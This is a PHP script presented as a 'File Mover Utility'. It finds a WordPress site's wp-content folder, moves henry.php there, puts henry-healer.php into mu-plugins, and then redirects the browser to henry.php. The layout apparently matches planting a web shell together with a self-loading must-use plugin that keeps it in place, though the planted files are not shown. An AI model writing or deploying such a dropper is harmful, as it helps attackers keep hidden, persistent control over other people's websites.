<?php
/**
 * File Mover Utility with Redirect
 * Moves specific files to designated WordPress directories and redirects.
 */

// 1. Robustly find the wp-content directory (Server Path)
$current_dir = __DIR__;
$wp_content_dir = '';
$search_dir = $current_dir;

while ($search_dir && $search_dir !== '.' && $search_dir !== DIRECTORY_SEPARATOR) {
    if (basename($search_dir) === 'wp-content') {
        $wp_content_dir = $search_dir;
        break;
    }
    $search_dir = dirname($search_dir);
}

if (empty($wp_content_dir)) {
    $wp_content_dir = dirname($current_dir, 2);
}

// 2. Define the files and their target destinations
$files_to_move = [
    'henry.php'        => $wp_content_dir . DIRECTORY_SEPARATOR . 'henry.php',
    'error_logs'       => $wp_content_dir . DIRECTORY_SEPARATOR . 'error_logs',
    'henry-healer.php' => $wp_content_dir . DIRECTORY_SEPARATOR . 'mu-plugins' . DIRECTORY_SEPARATOR . 'henry-healer.php',
];

// Start Output
echo "<div style='font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px; border-radius: 5px; max-width: 800px; margin: 20px auto;'>";
echo "<h3>Executing File Move Operations...</h3>";

// 3. Process each file
$all_success = true;
foreach ($files_to_move as $filename => $target_path) {
    $source_path = $current_dir . DIRECTORY_SEPARATOR . $filename;
    
    if (!file_exists($source_path)) {
        echo "<span style='color: #ffaa00;'>[SKIPPED]</span> Source file not found: <strong>{$filename}</strong><br>";
        continue;
    }

    $target_dir = dirname($target_path);
    if (!is_dir($target_dir)) {
        if (mkdir($target_dir, 0755, true)) {
            echo "<span style='color: #00aaff;'>[CREATED]</span> Directory: <strong>{$target_dir}</strong><br>";
        } else {
            echo "<span style='color: #ff4444;'>[ERROR]</span> Failed to create directory: <strong>{$target_dir}</strong><br>";
            $all_success = false;
            continue;
        }
    }

    if (rename($source_path, $target_path)) {
        echo "<span style='color: #00ff00;'>[SUCCESS]</span> Moved <strong>{$filename}</strong><br>";
    } else {
        echo "<span style='color: #ff4444;'>[FAILED]</span> Could not move <strong>{$filename}</strong><br>";
        $all_success = false;
    }
}

// 4. Calculate the URL for the redirect
// We dynamically grab the site's base URL up to the /wp-content/ folder
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
$host = $_SERVER['HTTP_HOST'];
$request_uri = $_SERVER['REQUEST_URI'];
$uri_parts = explode('/wp-content/', $request_uri);
$base_url = $protocol . $host . $uri_parts[0];
$redirect_url = $base_url . '/wp-content/henry.php';

echo "<hr style='border: 1px solid #333;'>";

if ($all_success) {
    echo "<strong>Operation Complete. Redirecting in 2 seconds...</strong>";
    echo "<br><br><a href='{$redirect_url}' style='color: #00aaff; text-decoration: none;'>Click here if you are not redirected automatically &rarr;</a>";
    
    // JavaScript Redirect
    echo "<script>
        setTimeout(function() {
            window.location.href = '{$redirect_url}';
        }, 2000);
    </script>";
} else {
    echo "<strong style='color: #ffaa00;'>Operation finished with warnings/errors. Auto-redirect cancelled so you can read the logs.</strong>";
    echo "<br><br><a href='{$redirect_url}' style='color: #00aaff; text-decoration: none;'>Go to henry.php manually &rarr;</a>";
}

echo "</div>";
?>